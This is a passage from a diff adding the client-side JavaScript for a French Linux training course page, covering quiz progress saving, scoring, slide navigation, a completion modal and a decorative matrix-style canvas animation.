+    await saveQcmProgress(currentUser.id, COURSE_ID, currentQcmSlide, correct);
+    document.getElementById('qcm-saving').classList.remove('show');
+    if (Object.keys(qcmAnswered).length === Object.keys(QCM).length) {
+      var tot=Object.keys(QCM).length, c=Object.values(qcmScores).filter(function(v){return v===1;}).length, pct=(c/tot)*100;
+      await completeCourse(currentUser.id, COURSE_ID, pct);
+      setTimeout(function(){ closeQcmAndAdvance(); showCompletion(pct); }, 1200); return;
+    }
+  }
+  document.getElementById('qcm-next-btn').classList.add('show');
+}
+
+function restoreQcmState(idx) {
+  var qcm=QCM[idx], score=qcmScores[idx];
+  document.querySelectorAll('.qcm-option').forEach(function(o,i){ o.classList.add('disabled'); if(i===qcm.correct) o.classList.add('correct'); });
+  var fb=document.getElementById('qcm-feedback');
+  fb.style.display='block'; fb.className='qcm-feedback '+(score===1?'correct':'wrong');
+  fb.textContent=(score===1?'✅ Déjà répondu. ':'❌ Réponse incorrecte. ')+qcm.explanation;
+}
+
+function closeQcmAndAdvance() {
+  document.getElementById('qcm-overlay').classList.remove('show');
+  if (currentQcmSlide===current && current<TOTAL-1) {
+    var next=current+1, curEl=document.querySelector('.slide.active'), nextEl=document.querySelector('.slide[data-index="'+next+'"]');
+    if (!curEl || !nextEl) return;
+    curEl.classList.remove('active'); curEl.classList.add('exit');
+    setTimeout(function(){ curEl.classList.remove('exit'); },400);
+    nextEl.classList.add('active'); current=next; updateUI();
+  }
+}
+
+function showCompletion(pct) {
+  var tot=Object.keys(QCM).length, c=Object.values(qcmScores).filter(function(v){return v===1;}).length;
+  document.getElementById('comp-score').textContent=Math.round(pct)+'%';
+  if(pct>=70){ document.getElementById('comp-icon').textContent='🏆'; document.getElementById('comp-title').textContent='Excellent !'; document.getElementById('comp-sub').textContent=c+' / '+tot+' bonnes réponses. Tu maîtrises Linux !'; }
+  else { document.getElementById('comp-icon').textContent='📚'; document.getElementById('comp-title').textContent='Formation terminée'; document.getElementById('comp-sub').textContent=c+' / '+tot+' bonnes réponses. Révise les slides pour progresser.'; }
+  document.getElementById('completion-modal').classList.add('show');
+}
+
+document.addEventListener('keydown', function(e){
+  if(document.getElementById('qcm-overlay').classList.contains('show')) return;
+  if(e.key==='ArrowRight'||e.key===' '){e.preventDefault();navigate(1);}
+  if(e.key==='ArrowLeft') navigate(-1);
+});
+var touchX=0;
+document.addEventListener('touchstart',function(e){touchX=e.touches[0].clientX;});
+document.addEventListener('touchend',function(e){
+  var dx=e.changedTouches[0].clientX-touchX;
+  if(Math.abs(dx)>50&&!document.getElementById('qcm-overlay').classList.contains('show')) navigate(dx<0?1:-1);
+});
+
+(function(){
+  var c=document.getElementById('matrix'),ctx=c.getContext('2d');
+  function resize(){c.width=window.innerWidth;c.height=window.innerHeight;}
+  resize(); window.addEventListener('resize',resize);
+  var chars='01$#!LINUXBASHROOT><|&/',fs=13,drops;
+  function init(){drops=Array(Math.floor(c.width/fs)).fill(1);}
+  init(); window.addEventListener('resize',init);
+  setInterval(function(){
+    ctx.fillStyle='rgba(2,8,4,0.05)';ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle='#00ff88';ctx.font=fs+'px monospace';
+    drops.forEach(function(y,i){
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*fs,y*fs);
+      if(y*fs>c.height&&Math.random()>.975)drops[i]=0;
+      drops[i]++;
+    });
+  },55);
+})();
+
+init();
+</script>
+</body>
+</html>
